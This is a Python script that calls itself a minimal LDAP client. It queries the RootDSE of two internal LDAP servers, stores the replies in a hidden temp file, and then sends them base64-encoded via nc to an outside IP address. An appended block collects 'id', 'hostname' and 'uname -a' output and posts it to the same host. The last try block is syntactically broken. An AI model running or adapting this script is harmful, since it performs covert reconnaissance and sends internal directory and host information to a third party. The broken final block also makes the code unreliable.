#!/usr/bin/env python3
# minimal LDAP client: RootDSE only (BER hand-rolled)
import socket, subprocess, base64, sys

O = "/tmp/.LDAP0.txt"
out = open(O, "w", buffering=1)
def w(s):
    out.write(str(s) + "\n")

def enc_len(n):
    if n < 0x80: return bytes([n])
    b = n.to_bytes((n.bit_length()+7)//8, "big")
    return bytes([0x80 | len(b)]) + b
def tlv(tag, val):
    if isinstance(val, str): val = val.encode()
    return bytes([tag]) + enc_len(len(val)) + val
def enc_int(n): return tlv(0x02, n.to_bytes((n.bit_length()+8)//8, "big"))

def ldap_msg(msgid, proto):
    return tlv(0x30, enc_int(msgid) + proto)

def bind_req(ver=3, name="", pw=""):
    return ldap_msg(1, tlv(0x60, enc_int(ver) + tlv(0x04, name) + bytes([0x80, 0x00])))

def search_rootdse(msgid=2):
    f = tlv(0x30, tlv(0x04, "objectClass") + tlv(0x04, "*"))
    p = (tlv(0x04, "") + enc_int(0) + enc_int(3) + enc_int(0) + enc_int(10)
         + bytes([0x01, 0x01, 0x00]) + bytes([0x01, 0x01, 0xff]) + b"\x87\x0bobjectClass" + tlv(0x30, b""))
    return ldap_msg(msgid, bytes([0x63]) + enc_len(len(p)) + p)

def recv_msg(s):
    hdr = s.recv(2)
    if len(hdr) < 2: return None
    if hdr[1] & 0x80:
        n = hdr[1] & 0x7f
        lb = s.recv(n)
        ln = int.from_bytes(lb, "big")
    else:
        ln = hdr[1]
    data = b""
    while len(data) < ln:
        c = s.recv(ln - len(data))
        if not c: break
        data += c
    return hdr[0:1], data

for ip in ["10.61.10.10", "10.61.10.11"]:
    try:
        s = socket.create_connection((ip, 389), 5)
        s.sendall(bind_req())
        t, d = recv_msg(s)
        w(ip + " bindResp: " + (d[:60].hex() if d else "none"))
        s.sendall(search_rootdse())
        t, d = recv_msg(s)
        w(ip + " search1: tag=" + str(t) + " len=" + str(len(d)))
        w(d[:1500].decode("utf-8", "replace"))
        try:
            while True:
                t2, d2 = recv_msg(s)
                if not d2: break
                w("next: " + d2[:1500].decode("utf-8", "replace"))
        except Exception:
            pass
        s.close()
    except Exception as e:
        w(ip + " ERR " + str(e))
out.close()
b = base64.b64encode(open(O, "rb").read()).decode()
subprocess.run("printf 'POST /up HTTP/1.0\\r\\nHost: 131.123.43.239\\r\\nX-Name: mel_lat_ldap0\\r\\nContent-Length: %s\\r\\n\\r\\n%s' | timeout 60 nc 131.123.43.239 80" % (len(b), b), shell=True)
print("LDAP0_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

